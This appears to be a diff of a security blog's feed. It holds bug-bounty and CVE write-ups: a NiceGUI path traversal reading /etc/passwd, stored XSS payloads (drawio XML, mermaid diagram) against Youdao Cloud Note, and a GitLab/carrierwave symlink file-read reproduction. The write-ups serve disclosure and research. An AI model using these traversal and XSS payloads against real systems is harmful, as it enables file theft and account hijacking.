+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pip install nicegui
+</code></pre></div></div>
+<p>Then, save following code to <code class="language-plaintext highlighter-rouge">main.py</code></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>from nicegui import ui
+
+m = ui.leaflet(center=(51.505, -0.09))
+ui.label().bind_text_from(m, 'center', lambda center: f'Center: {center[0]:.3f}, {center[1]:.3f}')
+ui.label().bind_text_from(m, 'zoom', lambda zoom: f'Zoom: {zoom}')
+
+with ui.grid(columns=2):
+    ui.button('London', on_click=lambda: m.set_center((51.505, -0.090)))
+    ui.button('Berlin', on_click=lambda: m.set_center((52.520, 13.405)))
+    ui.button(icon='zoom_in', on_click=lambda: m.set_zoom(m.zoom + 1))
+    ui.button(icon='zoom_out', on_click=lambda: m.set_zoom(m.zoom - 1))
+
+ui.run()
+</code></pre></div></div>
+<p>Run the application, it will listen on <code class="language-plaintext highlighter-rouge">http://127.0.0.1:8080</code> by default.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python main.py
+</code></pre></div></div>
+<p>Open the webpage in browser and intecept requests using burp suite or chrome devtools. We can capture following request:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET http://10.15.0.171:8080/_nicegui/1.4.20/resources/763203f93f18a3f1f5d14f74197580e4/leaflet/leaflet.js HTTP/1.1
+Accept: */*
+Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,ja-JP;q=0.6,ja;q=0.5
+Cache-Control: no-cache
+Cookie: 
+Pragma: no-cache
+Referer: http://10.15.0.171:8080/
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
+Postman-Token: 73930b8b-6cc7-4511-aff9-ff25d835c300
+Host: 10.15.0.171:8080
+Accept-Encoding: gzip, deflate
+Connection: close
+</code></pre></div></div>
+<p>Modify the request by change <code class="language-plaintext highlighter-rouge">leaflet/leaflet.js</code> part to <code class="language-plaintext highlighter-rouge">%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64</code> which is <code class="language-plaintext highlighter-rouge">../../../../../etc/passwd</code> url-encoded content.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET http://10.15.0.171:8080/_nicegui/1.4.20/resources/763203f93f18a3f1f5d14f74197580e4/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64 HTTP/1.1
+Accept: */*
+Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,ja-JP;q=0.6,ja;q=0.5
+Cache-Control: no-cache
+Cookie: _xsrf=2|87674a0e|961e2a9f73992956aae527a8f55167fb|1706518977; _gitlab_session=64bf3e7143f852d8e3646970f8c7b3df; fakesession=hello
+Pragma: no-cache
+Referer: http://10.15.0.171:8080/
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
+Postman-Token: 73930b8b-6cc7-4511-aff9-ff25d835c300
+Host: 10.15.0.171:8080
+Accept-Encoding: gzip, deflate
+Connection: close
+</code></pre></div></div>
+
+<p>Or just open link: <code class="language-plaintext highlighter-rouge">http://10.15.0.171:8080/_nicegui/1.4.20/resources/763203f93f18a3f1f5d14f74197580e4/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64</code> in browser(change ip and port to your server).</p>
+
+<p>The output is the contents of the <code class="language-plaintext highlighter-rouge">/etc/passwd</code> file:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+...
+</code></pre></div></div>
+
+<p><img src="/assets/cve/niceui.png" alt="niceui" /></p>
+
+<h2 id="impact">Impact</h2>
+
+<p>Any file on the backend filesystem can be read by an attacker with access to the NiceUI leaflet website.</p>
+
+<h2 id="reference">Reference</h2>
+
+<p><a href="https://github.com/zauberzeug/nicegui/issues/2870">https://github.com/zauberzeug/nicegui/issues/2870</a></p>
+
+<p><a href="https://www.cve.org/CVERecord?id=CVE-2024-32005">https://www.cve.org/CVERecord?id=CVE-2024-32005</a></p>
+
+<p><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-32005">https://nvd.nist.gov/vuln/detail/CVE-2024-32005</a></p>
+
+<p><a href="https://github.com/zauberzeug/nicegui/security/advisories/GHSA-mwc7-64wg-pgvj">https://github.com/zauberzeug/nicegui/security/advisories/GHSA-mwc7-64wg-pgvj</a></p>
+
+<p><a href="https://huntr.com/bounties/29ec621a-bd69-4225-ab0f-5bb8a1d10c67">https://huntr.com/bounties/29ec621a-bd69-4225-ab0f-5bb8a1d10c67</a></p>
+
+<h2 id="occurrences">Occurrences</h2>
+
+<p><a href="https://github.com/zauberzeug/nicegui/blob/eac5a5faa9fbd8823a6b76784a76fce618fd7afc/nicegui/nicegui.py#L98">https://github.com/zauberzeug/nicegui/blob/eac5a5faa9fbd8823a6b76784a76fce618fd7afc/nicegui/nicegui.py#L98</a></p>]]></content><author><name></name></author><category term="file-overwrite" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">高危：有道智云存在微博OAuth2登录缺陷串联XSS漏洞实现账户劫持(忽略!)</title><link href="http://localhost:4000/account-takeover/2024/04/09/ai-youdao-oauth2-account-takeover.html" rel="alternate" type="text/html" title="高危：有道智云存在微博OAuth2登录缺陷串联XSS漏洞实现账户劫持(忽略!)" /><published>2024-04-09T10:26:18+08:00</published><updated>2024-04-09T10:26:18+08:00</updated><id>http://localhost:4000/account-takeover/2024/04/09/ai-youdao-oauth2-account-takeover</id><content type="html" xml:base="http://localhost:4000/account-takeover/2024/04/09/ai-youdao-oauth2-account-takeover.html"><![CDATA[<h2 id="name">Name</h2>
 
 <blockquote>
   <p>有道智云存在微博OAuth2登录缺陷, 串联XSS漏洞实现账户劫持(对业务影响小，忽略hh)</p>
@@ -211,7 +800,7 @@ Sec-Fetch-Site: cross-site
 
 <ol>
   <li>对微博OAuth2设置state参数，并且限定redirect url。</li>
-</ol>]]></content><author><name></name></author><category term="account-takeover" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Huntr: Arbitrary File Overwrite in read_entityset api</title><link href="http://localhost:4000/file-overwrite/2024/04/07/arbitrary-file-overwrite-in-onnx-copy.html" rel="alternate" type="text/html" title="Huntr: Arbitrary File Overwrite in read_entityset api" /><published>2024-04-07T10:31:06+08:00</published><updated>2024-04-07T10:31:06+08:00</updated><id>http://localhost:4000/file-overwrite/2024/04/07/arbitrary-file-overwrite-in-onnx%20copy</id><content type="html" xml:base="http://localhost:4000/file-overwrite/2024/04/07/arbitrary-file-overwrite-in-onnx-copy.html"><![CDATA[<h2 id="name">Name</h2>
+</ol>]]></content><author><name></name></author><category term="account-takeover" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Huntr: Arbitrary File Overwrite in read_entityset api</title><link href="http://localhost:4000/file-overwrite/2024/04/07/arbitrary-file-overwrite-in-featuretools.html" rel="alternate" type="text/html" title="Huntr: Arbitrary File Overwrite in read_entityset api" /><published>2024-04-07T10:31:06+08:00</published><updated>2024-04-07T10:31:06+08:00</updated><id>http://localhost:4000/file-overwrite/2024/04/07/arbitrary-file-overwrite-in-featuretools</id><content type="html" xml:base="http://localhost:4000/file-overwrite/2024/04/07/arbitrary-file-overwrite-in-featuretools.html"><![CDATA[<h2 id="name">Name</h2>
 
 <blockquote>
   <p>Huntr: Arbitrary File Overwrite in read_entityset api in featuretools</p>
@@ -696,903 +1285,4 @@ ssh-rsa xxx hacker@test.com
 
 <h2 id="occurrences">Occurrences</h2>
 
-<p><a href="https://github.com/facebookresearch/fairseq/blob/bedb259bf34a9fc22073c13a1cee23192fa70ef3/fairseq/file_utils.py#L90">https://github.com/facebookresearch/fairseq/blob/bedb259bf34a9fc22073c13a1cee23192fa70ef3/fairseq/file_utils.py#L90</a></p>]]></content><author><name></name></author><category term="file-overwrite" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">中危：有道云笔记网页端渲染流程图存在存储型XSS漏洞</title><link href="http://localhost:4000/xss/2024/03/17/xss-drawio.html" rel="alternate" type="text/html" title="中危：有道云笔记网页端渲染流程图存在存储型XSS漏洞" /><published>2024-03-17T10:26:18+08:00</published><updated>2024-03-17T10:26:18+08:00</updated><id>http://localhost:4000/xss/2024/03/17/xss-drawio</id><content type="html" xml:base="http://localhost:4000/xss/2024/03/17/xss-drawio.html"><![CDATA[<h2 id="name">Name</h2>
-
-<blockquote>
-  <p>有道云笔记网页端渲染流程图存在存储型XSS漏洞</p>
-</blockquote>
-
-<h2 id="weakness">Weakness</h2>
-<blockquote>
-  <p>存储型XSS</p>
-</blockquote>
-
-<h2 id="severity">Severity</h2>
-<blockquote>
-  <p>中危</p>
-</blockquote>
-
-<h2 id="url">URL</h2>
-<ul>
-  <li>POC网页: <a href="https://note.youdao.com/s/QJo17hDz">https://note.youdao.com/s/QJo17hDz</a></li>
-  <li>视频链接：POC视频链接：<a href="https://pan.baidu.com/s/1nkL49AiaSa4YiRXic_qcLQ">https://pan.baidu.com/s/1nkL49AiaSa4YiRXic_qcLQ</a> 提取码：1314</li>
-</ul>
-
-<h2 id="key-payload">Key Payload</h2>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;mxfile host="Electron" modified="2022-05-01T12:59:04.467Z" agent="5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) draw.io/17.4.2 Chrome/100.0.4896.60 Electron/18.0.1 Safari/537.36" etag="kiR_NjkTd37TBbovy8cU" compressed="false" version="17.4.2" type="device"&gt;
-  &lt;diagram id="_Y4cO9PIdA5klW6TnyFV" name="Page-1"&gt;
-    &lt;mxGraphModel dx="1102" dy="714" grid="1" gridSize="10" guides="1" tooltips="1" connect="1" arrows="1" fold="1" page="1" pageScale="1" pageWidth="291" pageHeight="413" math="0" shadow="0"&gt;
-      &lt;root&gt;
-        &lt;mxCell id="0" /&gt;
-        &lt;mxCell id="1" parent="0" /&gt;
-        &lt;UserObject label="&amp;lt;select&gt;&amp;lt;iframe&gt;&amp;lt;/select&gt;&amp;lt;img src=x onerror=alert(document.domain)&gt;" tooltip="" id="kX_el6IuBEZSOJuKbBye-1"&gt;
-          &lt;mxCell style="rounded=0;whiteSpace=wrap;html=1;" vertex="1" parent="1"&gt;
-            &lt;mxGeometry x="150" y="170" width="90" height="40" as="geometry" /&gt;
-          &lt;/mxCell&gt;
-        &lt;/UserObject&gt;
-      &lt;/root&gt;
-    &lt;/mxGraphModel&gt;
-  &lt;/diagram&gt;
-&lt;/mxfile&gt;
-</code></pre></div></div>
-
-<h2 id="summary">Summary</h2>
-
-<p>网易有道云笔记可以上传流程图笔记，该笔记是xml格式的drawio文件。有道云笔记采用drawio插件对该文件进行渲染，然而，该插件版本过时并且存在存储型XSS漏洞。由于笔记可以分享，将分享链接发送给受害者后，即可控制受害者客户端，由此能够获取受害者的所有笔记和笔记内容，造成严重的用户隐私数据泄露。</p>
-
-<h3 id="detail">Detail</h3>
-
-<h4 id="trigger">Trigger</h4>
-<ol>
-  <li>
-    <p>将下面payload保存为drawio文件，命名为xss.drawio。</p>
-
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> &lt;mxfile host="Electron" modified="2022-05-01T12:59:04.467Z" agent="5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) draw.io/17.4.2 Chrome/100.0.4896.60 Electron/18.0.1 Safari/537.36" etag="kiR_NjkTd37TBbovy8cU" compressed="false" version="17.4.2" type="device"&gt;
- &lt;diagram id="_Y4cO9PIdA5klW6TnyFV" name="Page-1"&gt;
-     &lt;mxGraphModel dx="1102" dy="714" grid="1" gridSize="10" guides="1" tooltips="1" connect="1" arrows="1" fold="1" page="1" pageScale="1" pageWidth="291" pageHeight="413" math="0" shadow="0"&gt;
-     &lt;root&gt;
-         &lt;mxCell id="0" /&gt;
-         &lt;mxCell id="1" parent="0" /&gt;
-         &lt;UserObject label="&amp;lt;select&gt;&amp;lt;iframe&gt;&amp;lt;/select&gt;&amp;lt;img src=x onerror=alert(document.domain)&gt;" tooltip="" id="kX_el6IuBEZSOJuKbBye-1"&gt;
-         &lt;mxCell style="rounded=0;whiteSpace=wrap;html=1;" vertex="1" parent="1"&gt;
-             &lt;mxGeometry x="150" y="170" width="90" height="40" as="geometry" /&gt;
-         &lt;/mxCell&gt;
-         &lt;/UserObject&gt;
-     &lt;/root&gt;
-     &lt;/mxGraphModel&gt;
- &lt;/diagram&gt;
- &lt;/mxfile&gt;
-</code></pre></div>    </div>
-  </li>
-  <li>
-    <p>登录有道云笔记，<a href="https://note.youdao.com/">https://note.youdao.com/</a>. 点击左上侧“新建”，选择“上传文件”，将上一步的文件上传。</p>
-
-    <p><img src="/assets/images/youdaoyun2/save.png" alt="save" /></p>
-  </li>
-  <li>
-    <p>上传后，打开上传的流程图，xss触发。</p>
-
-    <p><img src="/assets/images/youdaoyun2/drawxss.png" alt="drawxss" /></p>
-  </li>
-  <li>
-    <p>将该笔记分享，发送给受害者打开，同样触发xss。</p>
-
-    <p><img src="/assets/images/youdaoyun2/share.png" alt="share" /></p>
-  </li>
-  <li>
-    <p>原因：drawio原始文件中，没有对UserObject元素的label字段进行过滤，导致label字段的xss得到执行。详见：<a href="https://github.com/jgraph/drawio/discussions/2791">https://github.com/jgraph/drawio/discussions/2791</a></p>
-  </li>
-</ol>
-
-<h3 id="proof">Proof</h3>
-<p>请提供截图或视频</p>
-
-<p>POC视频链接：<a href="https://pan.baidu.com/s/1nkL49AiaSa4YiRXic_qcLQ">https://pan.baidu.com/s/1nkL49AiaSa4YiRXic_qcLQ</a>
-提取码：1314</p>
-
-<h2 id="impact">Impact</h2>
-
-<p>该漏洞影响点击分享链接的用户，攻击者可以注入xss脚本获取受害者所有笔记ID和笔记内容，造成严重的敏感信息泄露。</p>
-
-<h2 id="patch-advice">Patch advice</h2>
-
-<ol>
-  <li>升级渲染drawio的插件到最新版本</li>
-</ol>]]></content><author><name></name></author><category term="xss" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">中危：有道云笔记markdown模式渲染类图(classDiagram)存储型XSS漏洞</title><link href="http://localhost:4000/xss/2024/03/16/xss-milkdown.html" rel="alternate" type="text/html" title="中危：有道云笔记markdown模式渲染类图(classDiagram)存储型XSS漏洞" /><published>2024-03-16T10:26:18+08:00</published><updated>2024-03-16T10:26:18+08:00</updated><id>http://localhost:4000/xss/2024/03/16/xss-milkdown</id><content type="html" xml:base="http://localhost:4000/xss/2024/03/16/xss-milkdown.html"><![CDATA[<h2 id="name">Name</h2>
-
-<blockquote>
-  <p>网易有道云笔记markdown模式渲染classDiagram存在存储型XSS漏洞</p>
-</blockquote>
-
-<h2 id="weakness">Weakness</h2>
-<blockquote>
-  <p>存储型XSS</p>
-</blockquote>
-
-<h2 id="severity">Severity</h2>
-<blockquote>
-  <p>中危</p>
-</blockquote>
-
-<h2 id="url">URL</h2>
-<ul>
-  <li>POC网页: <a href="https://note.youdao.com/s/2mc9Wfft">https://note.youdao.com/s/2mc9Wfft</a></li>
-  <li>视频链接：POC视频链接：<a href="https://pan.baidu.com/s/1GHxB356yrwWsILMcGRzk4A">https://pan.baidu.com/s/1GHxB356yrwWsILMcGRzk4A</a> 提取码：1314</li>
-</ul>
-
-<h2 id="key-payload">Key Payload</h2>
-
-<h2 id="summary">Summary</h2>
-
-<p>网易有道云笔记可以创建markdown笔记，该笔记中可插入mermaid类图。在构建过程中，该种类图的节点名称可以注入xss payload，milkdown插件未将该payload进行过滤，而是直接渲染执行，造成存储型xss攻击。由于笔记可以分享，将分享链接发送给受害者后，即可控制受害者客户端，由此能够获取受害者的所有笔记和笔记内容，造成严重的用户隐私数据泄露。</p>
-
-<h3 id="detail">Detail</h3>
-
-<h4 id="trigger">Trigger</h4>
-<ol>
-  <li>
-    <p>登录有道云笔记，<a href="https://note.youdao.com/">https://note.youdao.com/</a>. 点击左上侧“新建”，选择“Markdown”。</p>
-
-    <p><img src="/assets/images/youdaoyun/new-note.png" alt="newnote" /></p>
-  </li>
-  <li>
-    <p>进入markdown笔记编辑器，点击“更多”，下拉菜单选择“类图”。</p>
-
-    <p><img src="/assets/images/youdaoyun/more.png" alt="more" /></p>
-  </li>
-  <li>
-    <p>在类图的代码构建框中，填入以下payload，随即出现xss弹框。注意，xss在类图的节点名称中得到注入。</p>
-
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> classDiagram
- Class01 &lt;|-- `AveryLongClass&lt;img src='x' onerror=alert(document.domain)&gt;`
- Class03 *-- Class04
- Class05 o-- Class06
- Class07 .. Class08
- Class01 : size()
- Class01 : int chimp
- Class01 : int gorilla
-</code></pre></div>    </div>
-    <p>xss弹框触发：</p>
-
-    <p><img src="/assets/images/youdaoyun/xss.png" alt="xss" /></p>
-  </li>
-  <li>
-    <p>点击右上角分享按钮，生成分享链接。在新窗口打开分享的笔记链接，xss同样触发。</p>
-
-    <p>分享笔记：</p>
-
-    <p><img src="/assets/images/youdaoyun/share.png" alt="share" /></p>
-
-    <p>打开分享的笔记：</p>
-
-    <p><img src="/assets/images/youdaoyun/share-xss.png" alt="sharexss" /></p>
-  </li>
-  <li>
-    <p>原因：Milkdown第三方插件的漏洞，经过测试在milkdown最新版本v7.3.5得到验证。已在官方仓库提交漏洞issue。详见：<a href="https://github.com/Milkdown/milkdown/issues/1267">https://github.com/Milkdown/milkdown/issues/1267</a></p>
-  </li>
-</ol>
-
-<h3 id="proof">Proof</h3>
-<p>请提供截图或视频</p>
-
-<p>POC视频链接：<a href="https://pan.baidu.com/s/1GHxB356yrwWsILMcGRzk4A">https://pan.baidu.com/s/1GHxB356yrwWsILMcGRzk4A</a>
-提取码：1314</p>
-
-<h2 id="impact">Impact</h2>
-
-<p>该漏洞影响点击分享链接的用户，攻击者可以注入xss脚本获取受害者所有笔记ID和笔记内容，造成严重的敏感信息泄露。</p>
-
-<h2 id="patch-advice">Patch advice</h2>
-
-<ol>
-  <li>对类图的node名称进行xss过滤</li>
-</ol>]]></content><author><name></name></author><category term="xss" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Reproduction: Gitlab Arbitrary file read via the bulk imports UploadsPipeline</title><link href="http://localhost:4000/path-traversal/2024/01/15/arbitrary-file-read-via-bulk-imports.html" rel="alternate" type="text/html" title="Reproduction: Gitlab Arbitrary file read via the bulk imports UploadsPipeline" /><published>2024-01-15T10:31:06+08:00</published><updated>2024-01-15T10:31:06+08:00</updated><id>http://localhost:4000/path-traversal/2024/01/15/arbitrary-file-read-via-bulk-imports</id><content type="html" xml:base="http://localhost:4000/path-traversal/2024/01/15/arbitrary-file-read-via-bulk-imports.html"><![CDATA[<h2 id="name">Name</h2>
-
-<blockquote>
-  <p>Gitlab Arbitrary file read via the bulk imports UploadsPipeline</p>
-</blockquote>
-
-<h2 id="weakness">Weakness</h2>
-
-<blockquote>
-  <p>path-traversal</p>
-</blockquote>
-
-<h2 id="severity">Severity</h2>
-
-<blockquote>
-  <p>高危</p>
-</blockquote>
-
-<h2 id="environment">Environment</h2>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GitLab information
-
-Version: 14.6.0-ee
-Directory: /opt/gitlab/embedded/service/gitlab-rails
-</code></pre></div></div>
-
-<blockquote>
-  <p>原文：<a href="https://hackerone.com/reports/1439593">https://hackerone.com/reports/1439593</a></p>
-</blockquote>
-
-<p><strong>Gitlab Docker</strong></p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker run --detach \
-  --hostname 10.206.44.20 \
-  --publish 4435:443 --publish 8035:80 --publish 2235:22 \
-  --name gitlab14.6 \
-  --restart always \
-  --shm-size 256m \
-  gitlab/gitlab-ee:14.6.0-ee.0
-</code></pre></div></div>
-
-<h2 id="summary">Summary</h2>
-
-<p>Group导入，从其他gitlab instance导入，被导入的group milestone中的附件会形成压缩文件，并且下载到后端。而后端在解压时，没有对压缩包的symlink进行去除，导致该链接文件指向的任意文件被读取和导入。造成任意文件读取漏洞。</p>
-
-<h3 id="methods-flow">Methods flow</h3>
-
-<p>触发该行为的controller：
-<em>app/controllers/import/bulk_imports_controller.rb:43</em></p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def create
-    responses = create_params.map { |entry| ::BulkImports::CreateService.new(current_user, entry, credentials).execute }
-
-    render json: responses.map { |response| { success: response.success?, id: response.payload[:id], message: response.message } }
-end
-</code></pre></div></div>
-
-<p>文件解压采用popen执行命令方式：
-<em>lib/gitlab/import_export/command_line_util.rb</em></p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def untar_with_options(archive:, dir:, options:)
-    execute_cmd(%W(tar -#{options} #{archive} -C #{dir}))
-    execute_cmd(%W(chmod -R #{UNTAR_MASK} #{dir}))
-end
-</code></pre></div></div>
-
-<p>解压后对文件进行移动或者上传:
-<em>app/services/upload_service.rb</em></p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def execute
-    return unless file &amp;&amp; file.size &lt;= max_attachment_size
-
-    uploader = uploader_class.new(model, nil, **uploader_context)
-    uploader.store!(file)
-
-    uploader
-end
-</code></pre></div></div>
-<p>其中store!函数是carrierwave库的内置函数，用于移动文件。</p>
-
-<h3 id="analysis">Analysis</h3>
-
-<p>对carrierwave库进行demo测试，发现carrierwave的store!方法能够直接读取symlink指向的文件内容并且进行存储,对carrierwave进行文件操作测试：</p>
-
-<ol>
-  <li>测试路径穿越</li>
-  <li>测试symlink读取和写入</li>
-</ol>
-
-<p>参考：<a href="https://www.youtube.com/watch?v=4VkKmQWJoBI">Uploading files in Rails 5</a></p>
-
-<ol>
-  <li>create app: <code class="language-plaintext highlighter-rouge">rails new Carrierwave</code></li>
-  <li>add carrierwave to gemfile: <code class="language-plaintext highlighter-rouge">gem 'carrierwave', '~&gt; 3.0'</code></li>
-  <li><code class="language-plaintext highlighter-rouge">bundle install</code></li>
-  <li>create uploader:  <code class="language-plaintext highlighter-rouge">rails generate uploader File</code></li>
-  <li>create scaffold: <code class="language-plaintext highlighter-rouge">rails generate scaffold Test image:string</code></li>
-  <li>add <code class="language-plaintext highlighter-rouge">mount_uploader :image, FileUploader</code> to test.rb model</li>
-  <li>migrate db: <code class="language-plaintext highlighter-rouge">bin/rails db:migrate</code></li>
-  <li>change add image view: app/view/test/_form
- a. <code class="language-plaintext highlighter-rouge">&lt;%= form.file_field :image %&gt;</code></li>
-  <li>start server: <code class="language-plaintext highlighter-rouge">bin/rails s -b 0.0.0.0</code></li>
-  <li>open: localhost:3000/tests to upload image</li>
-  <li><code class="language-plaintext highlighter-rouge">bin/rails console</code> to debug:(prepare file: <code class="language-plaintext highlighter-rouge">ln -s /etc/passwd /home/kali/test</code>)
-    <ul>
-      <li>initialize
-        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  u = Test.new
-  u.id = 1
-  b = File.open("/home/kali/test")
-  u.image.store!(b)
-  check file content: /home/kali/rubyprojects/Carrierwave/public/uploads/test/image/1/test
-</code></pre></div>        </div>
-      </li>
-      <li>Uploader:: retrieve_from_store!方法：存在目录穿越问题
-        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  u.image.retrieve_from_store!('../../../../../../../../../../../etc/passwd')
-  u.image.file
-  #&lt;CarrierWave::SanitizedFile:0x00007f7daa7cfe50
-      @content=nil,
-      @content_type=nil,
-      @declared_content_type=nil,
-      @file="/etc/passwd",
-      @original_filename=nil&gt;
-</code></pre></div>        </div>
-      </li>
-      <li>Uploader:: retrieve_from_store!方法配合copy_to方法：通过目录穿越读取任意文件
-        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  u.image.retrieve_from_store!('../../../../../../../../../../../etc/passwd')
-  u.image.file
-  #&lt;CarrierWave::SanitizedFile:0x00007f7da8c38ea8
-      @content=nil,
-      @content_type=nil,
-      @declared_content_type=nil,
-      @file="/etc/passwd",
-      @original_filename=nil&gt;
-  b = File.open('/home/kali/test')
-  u.image.file.copy_to(b)
-  那么u.image.file指向的/etc/passwd会拷贝到文件/home/kali/test
-</code></pre></div>        </div>
-      </li>
-      <li>CarrierWave::SanitizedFile copy_to方法：存在读取链接文件问题
-        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  u.image.retrieve_from_store!('../../../../../../../../../../../home/kali/link') # link指向/etc/passwd
-  u.image.file
-  #&lt;CarrierWave::SanitizedFile:0x00007f7da89fc0b8
-      @content=nil,
-      @content_type=nil,
-      @declared_content_type=nil,
-      @file="/home/kali/link",
-      @original_filename=nil&gt;
-  u.image.file.copy_to(File.open('/home/kali/blank')) # 此时，blank文件被拷贝了passwd内容
-</code></pre></div>        </div>
-      </li>
-      <li>CarrierWave::SanitizedFile store!方法：存在读取链接文件问题
-        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  u.image.store!(File.open("/home/kali/link")) # link指向/etc/passwd，此时，passwd内容被存储进model的内部空间
-</code></pre></div>        </div>
-      </li>
-      <li>CarrierWave::SanitizedFile store!方法：测试写入链接文件能力，无该问题
-        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  u.image.retrieve_from_store!('../../../../../../../../../../../home/kali/test2') # test2指向test
-  u.image.store!(File.open("/home/kali/test3")) # 写入内容失败，原因是store!只会写入model指向的空间
-</code></pre></div>        </div>
-      </li>
-    </ul>
-  </li>
-</ol>
-
-<h2 id="tips">Tips</h2>
-
-<ol>
-  <li>get all routes of rails app:
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> gitlab-rails routes &gt; routes.txt
-</code></pre></div>    </div>
-  </li>
-  <li>create symlink and compress to tar.gz, extract tar.gz file to folder:
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> ln -s /etc/passwd passwd
-    
- tar –czf test.tar.gz passwd
-    
- tar –xzf test.tar.gz -c /tmp/data
-</code></pre></div>    </div>
-  </li>
-  <li>import burpsuite cert:
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> apt-get install -y ca-certificates
- convert burp.der to burp.crt format
- sudo openssl x509 -inform der -outform pem -in burp.der -out burp.crt
- copy burp.crt to ca loaction:
- sudo cp burp.crt /usr/local/share/ca-certificates/
- # 参考：https://docs.gitlab.com/omnibus/settings/ssl/index.html#using-a-custom-certificate-chain，gitlab自身配置了新地方
- sudo cp burp.crt /etc/gitlab/trusted-certs/
- sudo update-ca-certificates
- gitlab-ctl reconfigure 
-</code></pre></div>    </div>
-  </li>
-  <li>路径穿越，并且进行拷贝
-    <ul>
-      <li>fileK = retrieve_from_store!的参数为路径字符串，传入 ../ 能够索引到任意文件，类似于File.open()</li>
-      <li>copy_to的参数为file句柄，指向某文件路径。fileK调用该函数能够将上一步的任意文件拷贝到指定路径</li>
-    </ul>
-  </li>
-  <li>路径穿越读取链接文件，拷贝链接文件指向内容
-    <ul>
-      <li>fileK = retrieve_from_store!的参数为路径字符串，传入 ../ 能够索引到任意文件，类似于File.open()，也可以索引到链接文件</li>
-      <li>copy_to的参数为file句柄，指向某文件路径。fileK调用该函数能够将上一步的链接文件指向内容拷贝到指定路径</li>
-    </ul>
-  </li>
-  <li>直接读取链接文件指向内容
-    <ul>
-      <li>store!的参数是File句柄，当该句柄指向链接文件，那么可以读取链接文件内容。配合解压后的文件包含的链接文件。</li>
-    </ul>
-  </li>
-  <li>文件解压操作，命令行方式以及第三方库方式</li>
-  <li>
-    <p>ngrok伪造服务器，进行流量分发：</p>
-
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> from flask import Flask, request, Response, send_file
- import requests
-
- app = Flask(__name__)
- HTTP_METHODS = ['GET', 'HEAD', 'POST', 'PUT',
-                 'DELETE', 'CONNECT', 'OPTIONS', 'TRACE', 'PATCH']
-
- def do_proxy(request, path):
